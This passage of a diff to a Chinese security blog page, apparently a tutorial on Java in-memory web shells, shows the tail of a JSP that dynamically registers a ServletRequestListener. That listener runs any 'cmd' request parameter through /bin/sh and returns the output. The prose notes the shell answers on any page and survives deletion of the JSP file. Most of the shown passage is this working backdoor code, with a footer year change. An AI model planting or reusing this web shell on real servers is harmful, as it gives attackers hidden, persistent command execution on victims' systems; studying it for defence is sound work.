+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">requestInitialized</span><span class="o">(</span><span class="n">ServletRequestEvent</span> <span class="n">servletRequestEvent</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">cmder</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span><span class="o">[]</span> <span class="n">cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmder</span><span class="o">};</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Process</span> <span class="n">ps</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">BufferedReader</span> <span class="n">br</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">ps</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">line</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">br</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">//执行结果加上回车
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;&lt;br&gt;&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="o">.</span><span class="na">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;error &#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>通过 jsp 尝试动态添加 Listener，这里需要注意, 因为我们是直接通过 add 来添加, 所以每次访问该 jsp 页面的时候都会重复添加 Listener，导致恶意 payload 重复执行。添加成功后访问任意存在的页面 <code>?cmd=</code> 要执行的命令即可, 即使 jsp 文件被删除依然可以使用。</p>
 <h4 id="323-filter-内存马">3.2.3 Filter 内存马</h4>
@@ -607,7 +607,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
